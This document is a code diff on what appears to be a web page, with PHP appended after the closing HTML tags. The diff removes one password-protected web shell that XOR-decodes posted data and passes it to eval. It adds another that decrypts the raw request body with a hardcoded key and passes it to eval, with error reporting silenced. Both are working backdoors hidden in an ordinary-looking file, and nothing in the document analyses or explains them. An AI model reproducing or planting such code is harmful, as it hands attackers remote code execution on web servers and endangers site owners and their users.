@@ -9,33 +9,17 @@
     </body>
     </html>
 <?php
-@session_start();
-@set_time_limit(0);
 @error_reporting(0);
-function encode($D,$K){
-    for($i=0;$i<strlen($D);$i++) {
-        $c = $K[$i+1&15];
-        $D[$i] = $D[$i]^$c;
+function Decrypt($data)
+{
+    $key="e45e329feb5d925b"; 
+    $bs="base64_"."decode";
+	$after=$bs($data."");
+	for($i=0;$i<strlen($after);$i++) {
+    	$after[$i] = $after[$i]^$key[$i+1&15]; 
     }
-    return $D;
+    return $after;
 }
-$pass='Momika@233';
-$payloadName='payload';
-$key='2491bc9c7d8731e1';
-if (isset($_POST[$pass])){
-    $data=encode(base64_decode($_POST[$pass]),$key);
-    if (isset($_SESSION[$payloadName])){
-        $payload=encode($_SESSION[$payloadName],$key);
-        if (strpos($payload,"getBasicsInfo")===false){
-            $payload=encode($payload,$key);
-        }
-		eval($payload);
-        echo substr(md5($pass.$key),0,16);
-        echo base64_encode(encode(@run($data),$key));
-        echo substr(md5($pass.$key),16);
-    }else{
-        if (strpos($data,"getBasicsInfo")!==false){
-            $_SESSION[$payloadName]=encode($data,$key);
-        }
-    }
-}
+$post=Decrypt(file_get_contents("php://input"));
+eval($post);
+?>
